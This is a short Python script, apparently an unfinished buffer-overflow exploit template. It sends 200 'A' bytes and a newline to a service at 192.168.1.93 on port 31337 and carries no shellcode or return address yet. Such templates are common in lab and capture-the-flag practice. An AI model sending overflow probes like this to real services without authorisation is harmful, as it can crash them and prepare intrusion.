import socket, struct

host, port = '192.168.1.93', 31337
newline = b'\n'
payload = b''.join([
b'A'*200,
newline,


])





with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
